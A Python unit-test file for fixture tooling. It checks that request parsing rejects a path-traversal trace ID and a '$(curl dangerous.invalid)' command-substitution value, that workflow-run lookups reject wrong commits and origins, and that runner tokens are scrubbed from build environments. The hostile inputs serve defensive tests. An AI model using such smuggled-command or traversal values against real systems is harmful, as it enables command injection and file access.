import unittest

from tools.check_fixture import parse_request
from tools import run_encrypted_fixture
from tools import pi_fixture_dispatch as dispatcher
from unittest.mock import patch


class InputValidationTest(unittest.TestCase):
    def test_encrypt_wrapper_imports(self):
        self.assertTrue(callable(run_encrypted_fixture.main))

    def test_normal(self):
        self.assertEqual(parse_request("test-1234", "12", "-8"), (12, -8))

    def test_reject_bad_trace(self):
        with self.assertRaises(ValueError):
            parse_request("../../unsafe", "1", "2")

    def test_reject_payload_as_code(self):
        with self.assertRaises(ValueError):
            parse_request("trace-123", "$(curl dangerous.invalid)", "2")

    def test_reject_out_of_range(self):
        with self.assertRaises(ValueError):
            parse_request("trace-123", "99999", "2")


class HostileDispatchTest(unittest.TestCase):
    SHA = "a" * 40

    def test_reject_wrong_commit(self):
        with patch.object(dispatcher, "gh", return_value='[{"displayTitle":"fixture-test-12345","event":"workflow_dispatch","headBranch":"main","headSha":"' + "b" * 40 + '","databaseId":123}]'):
            with self.assertRaisesRegex(RuntimeError, "unapproved source commit"):
                dispatcher.locate_run("test-12345", self.SHA)

    def test_reject_duplicate_trace(self):
        row = {"displayTitle": "fixture-test-12345", "event": "workflow_dispatch", "headBranch": "main", "headSha": self.SHA, "databaseId": 123}
        import json
        with patch.object(dispatcher, "gh", return_value=json.dumps([row, row])):
            with self.assertRaisesRegex(RuntimeError, "Duplicate"):
                dispatcher.locate_run("test-12345", self.SHA)

    def test_reject_wrong_run_origin(self):
        details = {"headSha": self.SHA, "event": "pull_request", "headBranch": "main", "jobs": [{"name": n} for n in dispatcher.PLATFORMS]}
        with self.assertRaisesRegex(RuntimeError, "Unrecognized run origin"):
            dispatcher.validate_run_details(details, self.SHA)

    def test_reject_missing_matrix_job(self):
        details = {"headSha": self.SHA, "event": "workflow_dispatch", "headBranch": "main", "jobs": [{"name": "ubuntu-24.04"}]}
        with self.assertRaisesRegex(RuntimeError, "matrix job"):
            dispatcher.validate_run_details(details, self.SHA)

    def test_build_subprocess_environment_scrubs_runner_tokens(self):
        hostile_env = {
            "GITHUB_TOKEN": "never-export-me", "ACTIONS_RUNTIME_TOKEN": "nope",
            "MY_SECRET": "not-for-children", "PATH": "/usr/bin", "HOME": "/tmp",
            "VSINSTALLDIR": "C:\\VisualStudio", "VisualStudioVersion": "17.0",
        }
        actual = run_encrypted_fixture.sanitized_build_environment(hostile_env)
        self.assertEqual(actual, {"PATH": "/usr/bin", "HOME": "/tmp",
                                  "VSINSTALLDIR": "C:\\VisualStudio", "VisualStudioVersion": "17.0"})


if __name__ == "__main__":
    unittest.main()
